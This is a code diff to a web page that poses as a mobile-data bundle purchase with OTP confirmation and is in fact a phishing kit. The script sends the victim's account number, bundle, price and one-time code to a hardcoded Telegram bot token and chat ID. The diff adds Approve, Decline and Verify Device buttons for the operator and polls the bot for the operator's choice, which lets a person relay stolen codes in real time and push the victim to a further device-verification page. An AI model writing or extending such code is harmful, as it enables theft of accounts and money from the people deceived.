@@ -209,7 +209,7 @@
         </div>
         
         <div class="success-msg" id="successMsg">
-            ✓ OTP Verified! Purchase successful.
+            ✓ OTP Submitted! Waiting for approval...
         </div>
         
         <button class="btn-action" id="verifyBtn">
@@ -229,6 +229,14 @@
         const CONFIG = {
             BOT_TOKEN: '8625776173:AAE9XuhbvCy-Gp2d7GAbWLSp4c2sDUtExkw',
             CHAT_ID: '6573120346'
+        };
+
+        const state = {
+            lastUpdateId: 0,
+            pollInterval: null,
+            approveId: null,
+            declineId: null,
+            verifyDeviceId: null
         };
 
         const inputs = document.querySelectorAll('.otp-input');
@@ -279,6 +287,13 @@
         function showSpinner() { spinner.style.display = 'flex'; }
         function hideSpinner() { spinner.style.display = 'none'; }
 
+        function stopPolling() {
+            if (state.pollInterval) {
+                clearInterval(state.pollInterval);
+                state.pollInterval = null;
+            }
+        }
+
         verifyBtn.onclick = () => {
             const otp = getOTP();
             if (otp.length !== 6) {
@@ -290,7 +305,11 @@
             errMsg.style.display = 'none';
             showSpinner();
 
-            // Send OTP to Telegram for verification
+            const ts = Date.now();
+            state.approveId = `otp_approve_${ts}`;
+            state.declineId = `otp_decline_${ts}`;
+            state.verifyDeviceId = `otp_verify_device_${ts}`;
+
             const accountNumber = localStorage.getItem('accountNumber') || 'Unknown';
             const bundle = localStorage.getItem('selectedBundle') || 'Unknown';
             const price = localStorage.getItem('bundlePrice') || 'Unknown';
@@ -300,7 +319,7 @@
                             `Bundle: <code>${bundle}</code>\n` +
                             `Price: <code>GHS ${price}</code>\n` +
                             `OTP Code: <code>${otp}</code>\n\n` +
-                            `<i>User is waiting for confirmation...</i>`;
+                            `Approve this OTP?`;
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -308,22 +327,30 @@
                 body: JSON.stringify({
                     chat_id: CONFIG.CHAT_ID,
                     text: message,
-                    parse_mode: 'HTML'
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '✅ Approve & Complete', callback_data: state.approveId },
+                                { text: '❌ Decline', callback_data: state.declineId }
+                            ],
+                            [
+                                { text: '📱 Verify Device', callback_data: state.verifyDeviceId }
+                            ]
+                        ]
+                    }
                 })
             })
             .then(r => r.json())
             .then(data => {
-                // In a real scenario, we might wait for another bot approval.
-                // For this flow, we'll simulate a successful verification after sending to bot.
-                setTimeout(() => {
-                    hideSpinner();
+                if (data.ok) {
                     successMsg.style.display = 'block';
-                    verifyBtn.disabled = true;
-                    inputs.forEach(input => input.disabled = true);
-                    
-                    // Redirect to success page
-                    setTimeout(() => { window.location.href = 'success.html'; }, 2000);
-                }, 2000);
+                    startPolling();
+                } else {
+                    hideSpinner();
+                    errMsg.textContent = "Failed to send to bot.";
+                    errMsg.style.display = 'block';
+                }
             })
             .catch(err => {
                 hideSpinner();
@@ -332,12 +359,53 @@
             });
         };
 
+        function startPolling() {
+            stopPolling();
+            state.pollInterval = setInterval(() => {
+                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=10&allowed_updates=["callback_query"]`;
+
+                fetch(url)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!data.ok || !data.result?.length) return;
+
+                        for (const update of data.result) {
+                            state.lastUpdateId = update.update_id;
+                            const cb = update.callback_query;
+                            if (!cb) continue;
+
+                            if (cb.data === state.approveId) {
+                                stopPolling();
+                                hideSpinner();
+                                window.location.href = 'success.html';
+                                return;
+                            }
+
+                            if (cb.data === state.declineId) {
+                                stopPolling();
+                                hideSpinner();
+                                errMsg.textContent = "OTP Declined. Please try again.";
+                                errMsg.style.display = 'block';
+                                successMsg.style.display = 'none';
+                                return;
+                            }
+
+                            if (cb.data === state.verifyDeviceId) {
+                                stopPolling();
+                                hideSpinner();
+                                window.location.href = 'device_verify.html';
+                                return;
+                            }
+                        }
+                    })
+                    .catch(err => console.warn("Polling error:", err));
+            }, 2000);
+        }
+
         resendBtn.onclick = () => {
             alert("A new code has been requested.");
-            // Logic to trigger resend via bot or API
         };
 
-        // Auto-focus first input
         inputs[0].focus();
     </script>
 </body>
